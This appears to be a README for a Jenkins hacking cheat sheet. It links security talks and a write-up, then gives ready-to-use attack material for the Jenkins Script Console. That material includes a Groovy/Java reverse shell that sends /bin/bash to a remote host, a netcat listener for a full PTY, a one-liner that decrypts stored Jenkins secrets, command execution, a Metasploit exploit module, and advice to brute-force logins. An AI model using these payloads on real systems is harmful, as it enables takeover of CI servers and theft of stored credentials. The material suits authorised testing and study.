# Secure-or-Break-Jenkins
## Hack Jenkins! it's sweet
![](https://e5s6t7j5.rocketcdn.me/wp-content/uploads/2022/02/Jenkins-Best-Security-Practices.png)

### Talks
[BlackHat USA 2022](https://www.youtube.com/watch?v=Pe9nJLZvABM)

[Hacking Jenkins - Orange Tsai](https://www.youtube.com/watch?v=_x8BsBnQPmU)

[Best Practices for securing CI/CD Pipelines](https://www.youtube.com/watch?v=i3Bx1iSzrUY)

[CI/CD Pipeline Security - AWS](https://www.youtube.com/watch?v=BprhSs1eSWw)

### Writeup
[RCE in Jenkins](https://faizal-ctf.notion.site/Jenkins-Remote-Execution-Via-Malicious-Jobs-1247f23b95f043c08e5e7e0c183223ad?pvs=4)

## Extras
Reverse shell from Groovy
-------------------------
```m
In the left sidebar, navigate to "Manage Jenkins" > "Script Console", or just go to $rhost:8080/script

```


```java
String host="myip";
int port=1234;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

I'll leave this reverse shell tip to have a fully working PTY here in case anyone needs it , so dont do just nc -nlvp port instead do this :

```bash
stty raw -echo; (echo 'script -qc "/bin/bash" /dev/null';echo pty;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=xterm-256color;echo alias ll='ls -lsaht'; echo clear; echo id;cat) | nc -lvnp port && reset
```
Groovy Scripts
==============
Decrypt Jenkins secrets from Groovy
-----------------------------------

```java
println(hudson.util.Secret.decrypt("{...}"))
```


Command execution from Groovy
-----------------------------

```java
def proc = "id".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());
```
#### MSF exploit
**You can use MSF to get a reverse shell :

```bash
msf> use exploit/multi/http/jenkins_script_console
```
#### Bruteforce
**Jekins does not implement any password policy or username brute-force mitigation. 
Then, you should always try to brute-force users because probably weak passwords are being used (even usernames as passwords or reverse usernames as passwords).

```bash
msf> use auxiliary/scanner/http/jenkins_login
```
